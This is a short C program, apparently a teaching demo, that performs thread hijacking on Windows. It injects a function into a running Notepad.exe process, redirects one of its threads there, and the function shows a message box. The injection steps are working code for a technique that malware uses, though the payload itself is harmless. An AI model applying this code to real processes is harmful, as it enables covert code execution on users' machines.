// cl /nologo hijack.c user32.lib

#include <Windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#define MessageFuncAddress 0x00007FF8178CD230
typedef int (WINAPI *MessageFunc)(HWND, LPCSTR, LPCSTR, UINT);

DWORD searchProcessID(PCHAR ProcessName)
{
    PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, ProcessName) == 0) {
                printf("✅ %s found, processID = %d\n", pe.szExeFile, pe.th32ProcessID);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

HANDLE EnumThread(DWORD pid)
{
	THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	Thread32First(hSnapshot, &te);
	while(Thread32Next(hSnapshot, &te))
	{
		if(te.th32OwnerProcessID == pid)
		{
			return OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

void yourCode(BYTE* yourCodeAddress)
{// yourCodeAddress comes from CPU register: rcx.
	MessageFunc msgFunc = (MessageFunc)MessageFuncAddress;//Don’t call or reference MessageBoxA directly—it uses a relative address, which doesn’t work well across processes.
	msgFunc(NULL, yourCodeAddress + 0x200, yourCodeAddress + 0x100, MB_OK | MB_ICONINFORMATION);
	while(1);
}

void hijackRemoteThread(HANDLE remoteThread, LPVOID codeAddress)
{
	SuspendThread(remoteThread);

	CONTEXT ctx = { .ContextFlags = CONTEXT_CONTROL };
	GetThreadContext(remoteThread, &ctx);
	
	ctx.Rip = (DWORD64)codeAddress; // The address of the function yourCode.
	ctx.Rcx = (DWORD64)codeAddress; // The argument[yourCodeAddress] of the function yourCode.
	SetThreadContext(remoteThread, &ctx);

	ResumeThread(remoteThread);
}

int main()
{
	if(MessageBoxA != (MessageFunc)MessageFuncAddress)
	{
		printf("❌ Change MessageFuncAddress[line 7] to = 0x%p\n", MessageBoxA);
		return -1;
	}

	DWORD targetProcessID = searchProcessID("Notepad.exe");
	if(!targetProcessID)
	{
		printf("❌ Notepad.exe not found!\n🚀 Run Notepad.exe first\n");
		return -2;
	}

	HANDLE hTargetProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetProcessID);
	BYTE* remoteMemory = VirtualAllocEx(hTargetProcess, 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	HANDLE hTargetThread = EnumThread(targetProcessID);
	if(!remoteMemory || !hTargetThread)
	{
		printf("❌ failed to open thread or allocate memory.\n");
		return -3;
	}

	WriteProcessMemory(hTargetProcess, remoteMemory, yourCode, 0x100, 0);
	WriteProcessMemory(hTargetProcess, remoteMemory + 0x100, "AbuCoding", 0x100, 0);
	WriteProcessMemory(hTargetProcess, remoteMemory + 0x200, "Hello from hijacker", 0x100, 0);
	hijackRemoteThread(hTargetThread, remoteMemory);
}
